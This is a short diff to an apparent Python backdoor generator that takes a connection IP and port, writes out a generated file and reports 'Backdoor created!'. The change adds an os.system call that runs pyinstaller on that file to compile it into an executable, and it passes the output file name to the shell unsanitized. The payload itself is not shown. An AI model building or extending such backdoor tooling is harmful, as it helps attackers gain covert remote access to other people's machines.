@@ -1,6 +1,7 @@
 from optparse import OptionParser
 from sys import argv
 from colorama import Fore
+from os import system
 
 op = OptionParser ('--connection-ip <ip> -p <port>')
 op.add_option ('--connection-ip', dest='bi', type='string')
@@ -81,6 +82,7 @@ try:
     f = open (argv [-1], 'w')
     f.write (maket)
     f.close ()
+    system ('pyinstaller ' + argv [-1])
     print Fore.CYAN + '[*] ' + Fore.RESET + ' Backdoor created!'
 except:
     print Fore.RED + '[!]' + Fore.RESET + ' Error!'
